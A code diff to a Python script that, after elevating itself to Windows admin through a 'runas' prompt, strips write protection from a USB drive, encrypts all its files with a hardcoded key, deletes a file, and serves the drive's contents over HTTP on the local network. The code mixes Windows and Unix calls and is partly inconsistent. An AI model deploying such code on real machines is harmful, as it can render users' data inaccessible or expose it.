@@ -8,6 +8,8 @@ import hashlib
 import http.server
 import socket
 import threading
+import ctypes
+import sys
 
 KEY = hashlib.sha256(b"EOT").digest()  # Create a 256-bit key from the password
 
@@ -38,6 +40,12 @@ def delete_file(filepath):
     except Exception as e:
         print(f"Error deleting {filepath}: {e}")
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 def encrypt_file(filepath):
     """Encrypt a file using AES-256."""
     try:
@@ -52,7 +60,7 @@ def encrypt_file(filepath):
         
         print(f"Encrypted: {filepath}")
     except Exception as e:
-        print(f"Error encrypting {filepath}: {e})
+        print(f"Error encrypting {filepath}: {e}")
 
 def decrypt_file(filepath):
     """Decrypt a file using AES-256."""
@@ -116,6 +124,41 @@ def serve(directory, host='localhost', port=8000):
 
 def main():
     # Attempt to remove write protection
+
+    if is_admin():
+        # Your code that requires administrative privileges goes here
+        if not remove_write_protection():
+            return
+
+        # Read from USB and get mount point
+        mount_point = read_usb()
+
+        print("Files on USB drive:")
+        list_files(mount_point)
+
+        # Encrypt all files on the USB drive
+        encrypt_all_files(mount_point)
+
+        # Example: Delete a suspicious file
+        suspicious_file = os.path.join(mount_point, "suspicious_file.txt")
+        if os.path.exists(suspicious_file):
+            delete_file(suspicious_file)
+
+        # Serve the USB drive content via HTTP
+        host = socket.gethostbyname(socket.gethostname())  # Get the IPv4 address of the host machine
+        serve_thread = threading.Thread(target=serve, args=(mount_point, host, 8000))
+        serve_thread.start()
+
+        # Wait for server thread to finish (not necessary if you want the script to continue running)
+        serve_thread.join()
+
+        # Unmount the USB device after manipulation
+        os.system(f"umount {mount_point}")
+    else:
+        # Re-run the program with admin rights
+        print("Requesting admin privileges...")
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+
     if not remove_write_protection():
         return
 
